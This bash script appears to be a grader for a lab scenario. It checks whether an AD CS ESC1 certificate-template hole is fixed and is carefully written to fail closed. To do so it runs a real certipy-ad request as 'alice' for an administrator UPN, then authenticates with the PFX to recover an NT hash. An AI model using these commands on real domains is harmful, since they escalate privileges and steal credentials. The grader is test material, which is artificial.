#!/usr/bin/env bash
# meta4/ad-vm/scenario-07/verify-poc.sh
# PASS (exit 0) iff alice cannot coerce an Administrator PFX via ESC1.
#
# FAILS CLOSED. The previous version treated "no PFX was produced" as
# "PoC blocked" and exited 0. Because /usr/bin/certipy-ad did not exist on the
# attacker -- the provisioner symlinked pip names that pip never creates, into
# a directory the scenarios never call -- that branch fired on every run, and
# this scenario reported PASS on an unmodified, fully vulnerable box.
#
# Rules now:
#   * A missing or broken tool is a hard error (exit 2), never a pass.
#   * Only an EXPLICIT enrollment denial counts as blocked.
#   * Anything unrecognised fails, because an inconclusive probe is not
#     evidence that the host was repaired.

set -uo pipefail

CERTIPY=/usr/bin/certipy-ad
DC_IP=10.20.30.5
CA_NAME='corp-ca01-CA'
TEMPLATE='ESC1-SmartCard'

# --- tool preflight: a missing grader dependency must never look like a pass ---
if [ ! -x "$CERTIPY" ]; then
    echo "[verify-poc-07] HARNESS ERROR: $CERTIPY missing or not executable" >&2
    exit 2
fi
if ! "$CERTIPY" --help >/dev/null 2>&1; then
    echo "[verify-poc-07] HARNESS ERROR: $CERTIPY present but fails to run" >&2
    "$CERTIPY" --help 2>&1 | tail -3 >&2
    exit 2
fi

cd "$(mktemp -d)" || { echo "[verify-poc-07] HARNESS ERROR: mktemp failed" >&2; exit 2; }

REQ=$(timeout 60 "$CERTIPY" req \
    -u 'alice@corp.local' -p 'Password1!' \
    -ca "$CA_NAME" \
    -dc-ip "$DC_IP" \
    -template "$TEMPLATE" \
    -upn 'administrator@corp.local' 2>&1)
REQ_RC=$?

echo "--- certipy req output (rc=$REQ_RC) ---"
echo "$REQ"
echo "--- /certipy req ---"

# A timeout is not a repair. 124 is GNU timeout's signal that the command was
# killed; grading that as "blocked" would reward a host that merely became slow
# or unreachable.
if [ "$REQ_RC" -eq 124 ]; then
    echo "[verify-poc-07] enrollment timed out - inconclusive, not a pass" >&2
    exit 1
fi

# --- exploited? ---
if [ -f administrator.pfx ]; then
    AUTH=$(timeout 60 "$CERTIPY" auth -pfx administrator.pfx -dc-ip "$DC_IP" 2>&1)
    echo "--- certipy auth output ---"
    echo "$AUTH"
    if echo "$AUTH" | grep -qE 'NT hash|AS-REP received'; then
        echo "[verify-poc-07] ESC1 still exploitable - PFX + TGT + NT hash recovered" >&2
        exit 1
    fi
    echo "[verify-poc-07] a PFX was issued to alice for administrator@corp.local" >&2
    echo "[verify-poc-07] template still permits UPN takeover even though auth did not complete" >&2
    exit 1
fi

# --- explicitly blocked? ---
if echo "$REQ" | grep -qiE 'template.*not found|access_denied|enrollment.*denied|cannot enroll|does not exist'; then
    echo "[verify-poc-07] alice denied ESC1 enrollment - PoC BLOCKED"
    exit 0
fi

# --- anything else fails closed ---
echo "[verify-poc-07] no PFX and no recognised denial - INCONCLUSIVE, grading FAIL" >&2
echo "[verify-poc-07] an inconclusive probe is not evidence of remediation" >&2
exit 1
